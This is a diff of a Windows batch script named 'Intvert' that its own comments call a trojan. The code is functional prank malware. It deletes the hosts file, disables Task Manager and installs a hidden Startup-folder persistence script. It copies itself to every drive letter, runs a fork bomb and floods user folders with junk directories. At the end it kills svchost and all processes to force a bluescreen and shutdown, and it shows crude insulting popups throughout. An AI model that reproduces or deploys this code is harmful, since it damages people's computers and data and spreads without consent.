@@ -1,129 +1,136 @@
 @echo off
-timeout /t 2 /nobreak
-NET SESSION >nul 2>&1
-IF %ERRORLEVEL% EQU 0 (
-    goto :beens
-) ELSE (
-	cls
-	echo ---------------------------------------------
-	echo OI MATE START THIS IN ADMIN MODE TO WORK
-	echo ---------------------------------------------
-	echo.
-	pause >nul
-	exit
-)
-:beens
-::Reseting the hosts file 
+title Intvert
+:: Creating a dir for all the "payloads" to be stored in
 del %userprofile%\Intvert /F /S /Q 
 cd %userprofile%
 md Intvert
 cd %userprofile%\Intvert
-::Creating a dir for all the "payloads" to be stored in
+:: Find what directory im in (When running as admin the dir is set to sys32)
 set noea=0
 echo %~dp0 > tmpf 
 set /p curntDir= < tmpf 
 del tmpf
-
-
-goto skitero
+:: Reseting the hosts file 
 cd "c:\windows\system32\drivers\ect"
 del hosts /S /Q /A
 echo nul > hosts
-copy %curntDir%\Intvert.exe A:\Intvert.exe
-copy %curntDir%\Intvert.exe B:\Intvert.exe
-copy %curntDir%\Intvert.exe C:\Intvert.exe
-copy %curntDir%\Intvert.exe D:\Intvert.exe
-copy %curntDir%\Intvert.exe E:\Intvert.exe
-copy %curntDir%\Intvert.exe F:\Intvert.exe
-copy %curntDir%\Intvert.exe G:\Intvert.exe
-copy %curntDir%\Intvert.exe H:\Intvert.exe
-copy %curntDir%\Intvert.exe I:\Intvert.exe
-copy %curntDir%\Intvert.exe J:\Intvert.exe
-copy %curntDir%\Intvert.exe K:\Intvert.exe
-copy %curntDir%\Intvert.exe L:\Intvert.exe
-copy %curntDir%\Intvert.exe M:\Intvert.exe
-copy %curntDir%\Intvert.exe N:\Intvert.exe
-copy %curntDir%\Intvert.exe O:\Intvert.exe
-copy %curntDir%\Intvert.exe P:\Intvert.exe
-copy %curntDir%\Intvert.exe Q:\Intvert.exe
-copy %curntDir%\Intvert.exe R:\Intvert.exe
-copy %curntDir%\Intvert.exe S:\Intvert.exe
-copy %curntDir%\Intvert.exe T:\Intvert.exe
-copy %curntDir%\Intvert.exe U:\Intvert.exe
-copy %curntDir%\Intvert.exe V:\Intvert.exe
-copy %curntDir%\Intvert.exe W:\Intvert.exe
-copy %curntDir%\Intvert.exe X:\Intvert.exe
-copy %curntDir%\Intvert.exe Y:\Intvert.exe
-copy %curntDir%\Intvert.exe Z:\Intvert.exe
+::---------------------------------------------------------------------
+:: 2 files are made to make the script run by itself in the background this includes date.bat & startup.vbs
+:: This works by making the vbs trigger the .bat (Running in background), while the bat runs diffrent payloads depending on date.
+:: If nothing is set to run a script will start where the program tries to copy itself to any device it can
+:: By uncommenting the below command this disable this feature
+::---------------------------------------------------------------------
+::goto skitero
 :skitero
-xcopy %curntDir%\Divide.mp3 %Userprofile%\Intvert /y
-xcopy %curntDir%\Christ.mp3 %Userprofile%\Intvert /y
-xcopy %userprofile%\downloads\Christ.mp3 %Userprofile%\Intvert /y
-xcopy %userprofile%\downloads\Divide.mp3 %Userprofile%\Intvert /y
-goto BrthDay
+::--------------------------------
+:: 1.mp3 = Hotline Miami: Divide
+:: 2.mp3 = Cheetahman theme
+:: 3.mp3 = NES jingle bells theme
+::--------------------------------
+xcopy %curntDir%\1.mp3 %Userprofile%\Intvert /y
+xcopy %curntDir%\2.mp3 %Userprofile%\Intvert /y
+xcopy %curntDir%\3.mp3 %Userprofile%\Intvert /y
+xcopy %curntDir%\main.bat %Userprofile%\Intvert /y
+xcopy %curntDir%\silent.vbs %Userprofile%\Intvert /y
+::---------------------------------------------------------------------
+:: Copies from where the exe would put the needed files 
+:: aswell as from where the raw files are on a usb (If not compiled)
+::---------------------------------------------------------------------
+xcopy %userprofile%\downloads\1.mp3 %Userprofile%\Intvert /y
+xcopy %userprofile%\downloads\2.mp3 %Userprofile%\Intvert /y
+xcopy %userprofile%\downloads\3.mp3 %Userprofile%\Intvert /y
+xcopy %userprofile%\downloads\main.bat %Userprofile%\Intvert /y
+xcopy %userprofile%\downloads\silent.vbs %Userprofile%\Intvert /y
+:: Delete left over files (ONLY FOR EXE)
+del %userprofile%\Downloads\1.mp3 /F /S /Q 
+del %userprofile%\Downloads\2.mp3 /F /S /Q 
+del %userprofile%\Downloads\3.mp3 /F /S /Q 
+del %userprofile%\Downloads\main.bat /F /S /Q 
+del %userprofile%\Downloads\silent.bat /F /S /Q 
+:: Main Scripts
 
-FOR /F "skip=1" %%x IN ('wmic os get localdatetime') DO IF NOT DEFINED dmy_date SET dmy_date=%%x
-SET today=%dmy_date:~6,2%-%dmy_date:~4,2%-%dmy_date:~0,4%
-IF %today% == 21-12-2019 goto BrthDay
-IF %today% == 21-12-2020 goto BrthDay
-IF %today% == 21-12-2021 goto BrthDay
-IF %today% == 25-12-2019 goto Christ
-IF %today% == 25-12-2020 goto Christ
-IF %today% == 25-12-2021 goto Christ
-:Christ
-start christmas.vbs
-start christM.vbs
-:christa
-( echo @echo off
-  echo :pwnd
-  echo taskkill /f /im explorer.exe
-  echo goto pwnd) > Christms.bat
-goto christa
-
-:BrthDay
+:: CD to desktop and make a regedit restore file 
 cd %userprofile%\desktop
 ( echo @echo off
-  echo echo RUN AS ADMIN OR THE SCRIPT TO FIX WONT WORK
+  echo echo RUN AS ADMIN OR THE SCRIPT FIX WONT WORK
   echo pause
-  echo del %userprofile%\Intvert /F /S /Q 
+  echo del %%userprofile%%\Intvert /F /S /Q 
   echo REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
   echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 0 /f
   echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D 0 /F
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D 0 /F) >RESTORE-PC-SRLY.bat
+  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V SystemUsesLightTheme /T REG_DWORD /D 0 /F
+  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V EnableTransparency /T REG_DWORD /D 1 /F
+  echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V AppsUseLightTheme /T REG_DWORD /D 0 /F) >RESTORE-PC-SRLY.bat
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-
+:: Now disable taskmgr, reset Magnifier magnification aswell as having it open minimized (/min dosen't work on magnifier)
 cd %Userprofile%\Intvert
+:: CD to the invert folder made earlier in the script
+:: Lets start making some scripts
 ::--------------------BAT---------------------------
-( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
-  echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
-  echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
-  echo xcopy %%userprofile%%\downloads\*.* %%userprofile%%\documents /C /Y
-  set /a dris="%%userprofile%%\documents"
-  echo :noRest
-  echo set drs=0
-  echo :daws
-  echo set lo=0
-  echo cd %%dris%%
-  echo :noea
-  echo md YouAreAnIdiot%%random%%%%random%%%%random%%%%random%%%%random%%
-  echo set /a lo=%%lo%%+1
-  echo if %%lo%%==4096 goto nea
-  echo goto noea
-  echo :nea
-  echo set /a drs=%%drs%%+1
-  echo set lo=0
-  echo if %%drs%% ==1 set /a dris="%%userprofile%%\desktop"
-  echo if %%drs%% ==2 set /a dris="%%userprofile%%\music"
-  echo if %%drs%% ==3 set /a dris="%%userprofile%%\photos"
-  echo if %%drs%% ==4 set /a dris="%%userprofile%%\downloads"
-  echo if %%drs%% ==5 set /a dris="%%userprofile%%\documents"
-  echo if %%drs%% ==6 goto noRest
-  echo goto daws) > mdhole.bat
+( echo @echo off
+  echo :sd
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe A:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe B:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe D:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe E:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe F:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe G:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe H:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe I:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe J:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe K:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe L:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe M:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe N:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe O:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe P:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Q:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe R:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe S:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe T:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe U:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe V:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe W:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe X:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Y:\Intvert.exe /y
+  echo xcopy %%Userprofile%%\Intvert\Intvert.exe Z:\Intvert.exe /y
+  echo goto sd) > idla.bat
 ( echo %%0% %^|% %%%0%) > bomb.bat
+( echo @echo off	
+  echo timeout /t 30 /nobreak
+  echo cd %%userprofile%%\Intvert
+  echo FOR /F "skip=1" %%%%x IN ^('wmic os get localdatetime^'^) DO IF NOT DEFINED dmy_date SET dmy_date=%%%%x
+  echo SET today=%%dmy_date^:^~6,2%%^-%%dmy_date^:^~4,2%%^-%%dmy_date^:^~0,4%%
+  echo IF %%today%% == 21-12-2019 goto BrthDay
+  echo IF %%today%% == 21-12-2020 goto BrthDay
+  echo IF %%today%% == 21-12-2021 goto BrthDay
+  echo IF %%today%% == 22-12-2019 goto Christmas
+  echo IF %%today%% == 22-12-2020 goto Christmas
+  echo IF %%today%% == 22-12-2021 goto Christmas
+  echo :idle
+  echo start S10.vbs
+  echo timeout /t 30 /nobreak
+  echo :BrthDay
+  echo SET MyProcess=Intvert.exe
+  echo TASKLIST ^| FINDSTR /I "%%MyProcess%%"
+  echo IF ERRORLEVEL 1 (GOTO Sta^)
+  echo GOTO BrthDay
+  echo :Sta 
+  echo call %%userprofile%%\Intvert\Intvert.exe
+  echo GOTO BrthDay
+  echo :Christmas
+  echo start XMASvbs
+  echo start XMAS2.vbs
+  echo goto BLACK
+  echo :BLACK
+  echo timeout /t 2 /nobreak
+  echo taskkill /f /im explorer.exe
+  echo goto BLACK
+  echo :end
+  echo exit )>date.bat
+:: This was a pain to make work
 ( echo @echo off
   echo :check
   echo set /a Rand=%%random%% %%%%4
@@ -189,19 +196,23 @@ cd %Userprofile%\Intvert
   echo timeout /t 7
   echo goto check) > b.bat
 ( echo @echo off
-  echo cd %userprofile%\Intvert
-  echo curl -o "haxr.jpg" https://image.freepik.com/free-vector/protection-against-hacker_106788-323.jpg
-  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f
-  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\haxr.jpg /f
-  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
-  echo set lo=0
-  echo :noea
-  echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-  echo set /a lo=%%lo%%+1
-  echo if %%lo%%==64 goto nea
-  echo goto noea
-  echo :nea
-  echo exit) > g.bat
+  echo cd C:\WINDOWS\system32
+  echo :a
+  echo start Magnify.exe
+  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
+  echo timeout /t 1
+  echo start Magnify.exe
+  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
+  echo timeout /t 1
+  echo goto a) >c.bat
+( echo @echo off
+  echo :check
+  echo set /a Rand=%%Random%% %%%%400
+  echo if %%Rand%%==%%chek%% goto check
+  echo set /a chek=%%Rand%%
+  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
+  echo timeout /t 3
+  echo goto check) > d.bat
 ( echo @echo off
   echo :check
   echo set /a Rand=%%random%% %%%%20
@@ -241,54 +252,82 @@ cd %Userprofile%\Intvert
   echo set /a a=%%random%% %%%%1
   echo set /a b=%%random%% %%%%1
   echo set /a c=%%random%% %%%%1
-  echo set /a d=%%random%% %%%%1
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D 1 /F
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D 1 /F
-  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D 1 /F
+  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D %a% /F
+  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D %b% /F
+  echo REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D %c% /F
   echo timeout /t 4
-  echo goto check) > f.bat
+  echo goto asd) > f.bat
 ( echo @echo off
-  echo cd C:\WINDOWS\system32
-  echo :a
-  echo start Magnify.exe
-  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
-  echo timeout /t 1
-  echo start Magnify.exe
-  echo reg add HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
-  echo timeout /t 1
-  echo goto a) >c.bat
-( echo @echo off
-  echo :check
-  echo set /a Rand=%%Random%% %%%%400
-  echo if %%Rand%%==%%chek%% goto check
-  echo set /a chek=%%Rand%%
-  echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
-  echo timeout /t 3) > d.bat
+  echo cd %userprofile%\Intvert
+  echo curl -o "haxr.jpg" https://image.freepik.com/free-vector/protection-against-hacker_106788-323.jpg
+  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f
+  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\haxr.jpg /f
+  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+  echo set lo=0
+  echo :noea
+  echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+  echo set /a lo=%%lo%%+1
+  echo if %%lo%%==64 goto nea
+  echo goto noea
+  echo :nea
+  echo exit) > g.bat
+( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
+  echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
+  echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
+  echo xcopy %%userprofile%%\downloads\*.* %%userprofile%%\documents /C /Y
+  set /a dris="%%userprofile%%\documents"
+  echo :noRest
+  echo set drs=0
+  echo :daws
+  echo set lo=0
+  echo cd %%dris%%
+  echo :noea
+  echo md YouAreAnIdiot%%random%%%%random%%%%random%%%%random%%%%random%%
+  echo set /a lo=%%lo%%+1
+  echo if %%lo%%==4096 goto nea
+  echo goto noea
+  echo :nea
+  echo set /a drs=%%drs%%+1
+  echo set lo=0
+  echo if %%drs%% ==1 set /a dris="%%userprofile%%\desktop"
+  echo if %%drs%% ==2 set /a dris="%%userprofile%%\music"
+  echo if %%drs%% ==3 set /a dris="%%userprofile%%\photos"
+  echo if %%drs%% ==4 set /a dris="%%userprofile%%\downloads"
+  echo if %%drs%% ==5 set /a dris="%%userprofile%%\documents"
+  echo if %%drs%% ==6 goto noRest
+  echo goto daws) > h.bat
+:: This script is evil and I hate it
 ::--------------------VBS---------------------------
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "Divide.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >trk.vbs
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "Christ.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >ChristM.vbs
-( echo x=msgbox("Get that shit loaded",48,"In YA"^)) >M1.vbs
-( echo x=msgbox("Still using this computer^?",48,"No Shit"^)) >M2.vbs
-( echo x=msgbox("Lemon mixed with milk",48,"Vinesause^?"^)) >M3.vbs
-( echo x=msgbox("Cum Slut",48,"U know u are"^)) >M0.vbs
-::-----------------------------------------------------------------------------
 ( echo do
   echo x=msgbox("It's Christmas, Go Outside",48,"FUCK OFF MATE"^)
-  echo loop) >christmas.vbs
-::-----------------------------------------------------------------------------
+  echo loop) >XMAS2.vbs
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "3.mp3"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >XMAS.vbs
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "1.mp3"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Divide.vbs
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "2.mp3"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Cheeta.vbs
+( echo x=msgbox("Boo!",48,"In YA"^)) >M1.vbs
+( echo x=msgbox("Still using this computer^?",48,"No Shit"^)) >M2.vbs
+( echo x=msgbox("Lemon mixed with milk",48,"Vinesause^?"^)) >M3.vbs
+( echo x=msgbox("HIT ME AGAIN GODDAMMIT",48,"Ghost"^)) >M0.vbs
+( echo x=msgbox("Rest in Piss Forever Miss",48," "^)) >End.vbs
+:: The below scripts make the cmd window not appear as visable when lauched
 ( echo Set WshShell = CreateObject("WScript.Shell"^) 
   echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\a.bat" ^& Chr(34^), 0
   echo Set WshShell = Nothing) >S1.vbs
@@ -313,7 +352,17 @@ cd %Userprofile%\Intvert
 ( echo Set WshShell = CreateObject("WScript.Shell"^) 
   echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\Bomb.bat" ^& Chr(34^), 0
   echo Set WshShell = Nothing) >S8.vbs
-  
+( echo Set WshShell = CreateObject(" WScript.Shell"^) 
+  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\h.bat" ^& Chr(34^), 0
+  echo Set WshShell = Nothing) >S9.vbs
+( echo Set WshShell = CreateObject("WScript.Shell"^) 
+  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\idla.bat" ^& Chr(34^), 0
+  echo Set WshShell = Nothing) >S10.vbs
+cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+( echo Set WshShell = CreateObject("WScript.Shell"^) 
+  echo WshShell.Run chr(34^) ^& "C:\Users\%%Username%%\Intvert\date.bat" ^& Chr(34^), 0
+  echo Set WshShell = Nothing) >S11.vbs
+cd %Userprofile%\Intvert
 ( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
   echo do
   echo wscript.sleep 100
@@ -357,16 +406,54 @@ cd %Userprofile%\Intvert
   echo.
   echo Shutting down has a chance of harming yous system so I don't 
   echo reccomend it, just wait till the drop. Enjoy :D) >Yes.txt
+( echo.
+  echo So your computer has been trashed by the Intvert tojan
+  echo.
+  echo You haven't rebooted which im guessing means you want to
+  echo see more payloads, or your scared frozen and don't know what
+  echo to do, most people by now would've restarted but thats not you
+  echo This trojan isn't harmfull its made to scare you, this "trojan"
+  echo changes some reg keys and because of this a .bat has been made
+  echo on the desktop to re-enable taskmgr and reset magnifier.
+  echo.
+  echo Since your still here we might aswell give you a show
+  echo If this system is "low-end" its going to crash, if not
+  echo Enjoy :D) >GiveItASec.txt
+
+::-----------------------------------------------------------------------------------------------------------------------------------------------
+:: FILE NAME  | DISCRIPTION                                                   | COMMENT
+::-----------------------------------------------------------------------------------------------------------------------------------------------
+:: S1.vbs     | Random popup messages                                         |
+:: S2.vbs     | Random popup website                                          | First payload made, used to be just this one payload
+:: S3.vbs     | Invert colours on screen                                      |
+:: S4.vbs     | Random zoom on cursor                                         | 
+:: S5.vbs     | Open Random sys32 aplications                                 |
+:: S6.vbs     | Cycle between light and dark mode for                         |
+:: S7.vbs     | Change background                                             |
+:: S8.vbs     | Bomb payload                                                  |
+:: S9.vbs     | Move all files in desktop/music/photos/downloads to documents | Only use if you hate the person who is reciving this file
+:: S10.vbs    | Copy exe to any connected drives                              | Dosen't work for usb
+:: kes.vbs    | Send keystrokes                                               | Helps to be flaged by anti-virus as a trojan
+:: Divide.vbs | Play the first music track                                    |
+:: Cheeta.vbs | Play the seccond music track                                  |
+:: XMAS.vbs   | Play the third music track                                    |
+:: end.vbs    | REST IN PISS FOREVER MISS                                     | Popup message
+:: v.vbs      | Max volume                                                    | Maxes out the volume by sending the volume up key every 10 nano
+::-----------------------------------------------------------------------------------------------------------------------------------------------
 rundll32.exe %SystemRoot%\system32\shell32.dll,Control_RunDLL %SystemRoot%\system32\desk.cpl desk,@Themes /Action:OpenTheme /file:"C:\Windows\Resources\Themes\aero.theme"
-taskkill /f /im SystemSettings.exe
+:: Change windows theme (Spooky)
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
+:: Hide desktop icons, then restart explorer (makes the ablove script more reliable)
 taskkill /f /im explorer.exe
 start explorer.exe
 Rundll32 user32,SwapMouseButton
+:: Do I need to explain what this dose (Swap mouse buttons)
 start s7.vbs
 start trk.vbs
 start Yes.txt
+:: Open a txt document tring to scare the user
 timeout /t 28 /nobreak
+:: Fun fact: Without error the next payload is timed with the drop of the song
 start S2.vbs
 start S6.vbs
 start kes.vbs
@@ -384,27 +471,39 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V Hi
 taskkill /f /im explorer.exe
 start explorer.exe
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-( echo.
-  echo So your computer has been trashed by the Intvert tojan
-  echo.
-  echo You haven't rebooted which im only guessing means you want
-  echo To see more payloads, or your scared and don't know what
-  echo to do, most people by now would've restarted but thats not you
-  echo This trojen isn't harmfull its made to scare, this "trojen"
-  echo changes some reg keys and because of this a .bat has been made
-  echo on the desktop to re-enable taskmgr and reset magnifier.
-  echo.
-  echo Since your still here we might aswell give you a show
-  echo If this system is "low-end" its going to crash, if not
-  echo Enjoy :D) >GiveItASec.txt
+for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
 TASKKILL /F /IM explorer.exe
+TASKKILL /F /IM firefox.exe
+TASKKILL /F /IM chrome.exe
+TASKKILL /F /IM MicrosoftEdge.exe
+TASKKILL /F /IM Magnify.exe
+:: Attempt to kill all current payloads to "talk" to the user
 start /max GiveItASec.txt
 timeout /t 32 /nobreak
 start explorer.exe
 start S2.vbs
+start Cheeta.vbs 
 timeout /t 16 /nobreak 
-::SLOW THIS SHIT DOWN
+:: SLOW THIS SHIT DOWN
 start S8.vbs
-timeout /t 16 /nobreak
-::LETS FINNISH THIS BITCH
+timeout /t 48 /nobreak
+:: LETS FINNISH THIS PC
+taskkill /f /im explorer.exe
+REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
+for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
+TASKKILL /F /IM explorer.exe
+TASKKILL /F /IM firefox.exe
+TASKKILL /F /IM chrome.exe
+TASKKILL /F /IM MicrosoftEdge.exe
+TASKKILL /F /IM Magnify.exe
+taskkill /F /IM wscript.exe
+start end.vbs
+timeout /t 4 /nobreak
+:win10
 taskkill /F /Im svchost.exe
+:: Bluescreen (Win10 only, I think)
+:win7
+Powershell.exe -executionpolicy get-process | stop-process -force
+:: Bluescreen hopefuly (Never been able to test this)
+:shutdownr
+shutdown /s /f /c "HOW HAVE YOU NOT BLUESCREENED YET, JUST DIE" /t 60
